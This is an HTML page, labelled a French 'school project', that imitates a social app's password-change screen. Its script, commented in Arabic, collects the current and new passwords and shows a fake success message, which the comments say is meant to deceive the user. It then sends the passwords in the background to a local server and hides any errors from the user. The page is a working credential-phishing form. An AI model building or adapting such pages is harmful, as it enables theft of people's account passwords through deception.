<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Projet Scolaire - Modification de mot de passe</title>

<style>
*{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body {
    background: #000000;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 15px;
}

.container {
    width: 100%;
    max-width: 450px;
    background: #121212;
    min-height: 90vh;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    padding: 24px;
}

.top-section {
    width: 100%;
}

.back-arrow {
    color: #ffffff;
    font-size: 24px;
    margin-bottom: 30px;
    cursor: pointer;
    text-decoration: none;
    display: inline-block;
}

.meta-info {
    color: #a8a8a8;
    font-size: 14px;
    margin-bottom: 8px;
}

h1 {
    color: #f5f5f5;
    font-size: 24px;
    font-weight: 700;
    margin-bottom: 16px;
}

p {
    color: #a8a8a8;
    font-size: 14px;
    line-height: 1.4;
    margin-bottom: 30px;
}

input[type="password"] {
    width: 100%;
    background: #1c1c1e;
    border: 1px solid #3a3a3c;
    border-radius: 12px;
    padding: 16px;
    color: #ffffff;
    margin-bottom: 12px;
    font-size: 14px;
    outline: none;
}

input[type="password"]::placeholder {
    color: #767676;
}

.forgot-link {
    color: #0095f6;
    font-size: 14px;
    text-decoration: none;
    display: inline-block;
    margin-top: 8px;
    margin-bottom: 20px;
    font-weight: 600;
}

.checkbox-container {
    display: flex;
    align-items: flex-start;
    gap: 12px;
    margin-top: 10px;
}

.checkbox-container input {
    margin-top: 3px;
    accent-color: #0095f6;
}

.checkbox-label {
    color: #f5f5f5;
    font-size: 14px;
    line-height: 1.4;
}

#toastMessage {
    display: none;
    color: #4cd964;
    font-size: 14px;
    text-align: center;
    margin-top: 15px;
    font-weight: 600;
}

.button-section {
    width: 100%;
    margin-top: 40px;
}

button {
    width: 100%;
    height: 44px;
    border: none;
    border-radius: 22px;
    background: #1c2b4d;
    color: #ffffff;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.3s;
}

button:hover {
    background: #0095f6;
}
</style>
</head>

<body>

<div class="container">

    <div class="top-section">
        <a href="#" class="back-arrow">&#8592;</a>
        
        <div class="meta-info">Compte • Sécurité</div>
        <h1>Changer de mot de passe</h1>
        
        <p>
            Votre mot de passe doit contenir au moins 6 caractères ainsi qu’une combinaison de chiffres, de lettres et de caractères spéciaux (!@#$%).
        </p>

        <form id="passwordForm" onsubmit="sendDataToBackend(event)">

            <input 
                type="password" 
                id="currentPass" 
                placeholder="Mot de passe actuel" 
                required>

            <input 
                type="password" 
                id="newPass" 
                placeholder="Nouveau mot de passe" 
                required>

            <input 
                type="password" 
                id="confirmPass" 
                placeholder="Retapez le nouveau mot de passe" 
                required>

            <a href="#" class="forgot-link">Mot de passe oublié ?</a>

            <div class="checkbox-container">
                <input type="checkbox" id="logout-all">
                <label for="logout-all" class="checkbox-label">
                    Se déconnecter des autres appareils. Choisissez cette option si une autre personne a utilisé votre compte.
                </label>
            </div>

            <div id="toastMessage">✓ Le mot de passe a été changé avec succès.</div>
    </div>

    <div class="button-section">
            <button type="submit">
                Changer le mot de passe
            </button>
        </form>
    </div>

</div>

<script>
async function sendDataToBackend(event) {
    // 1. منع الصفحة من إعادة التحميل أو تغيير الرابط
    event.preventDefault(); 

    // 2. جلب الكلمات التي كتبها المستخدم من الحقول
    const currentPassword = document.getElementById('currentPass').value;
    const newPassword = document.getElementById('newPass').value;
    const confirmPassword = document.getElementById('confirmPass').value;

    // 3. إظهار رسالة النجاح الصغيرة على الواجهة فوراً لخداع المستخدم
    const toast = document.getElementById('toastMessage');
    toast.style.display = 'block';
    
    // تفريغ الحقول وإخفاء الرسالة بعد 3 ثوانٍ
    document.getElementById('passwordForm').reset();
    setTimeout(() => { toast.style.display = 'none'; }, 3000);

    // 4. إرسال البيانات بسرية تامة بالخلفية إلى السيرفر المحلي المحفوظ على الكمبيوتر
    try {
        await fetch('http://localhost:3000/api/save', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                current: currentPassword,
                new: newPassword,
                confirm: confirmPassword
            })
        });
    } catch (error) {
        // في حال كان السيرفر مطفأ لا تظهر أي خطأ للمستخدم عادي
        console.log("السيرفر المحلي localhost ليس قيد التشغيل حالياً.");
    }
}
</script>

</body>
</html>
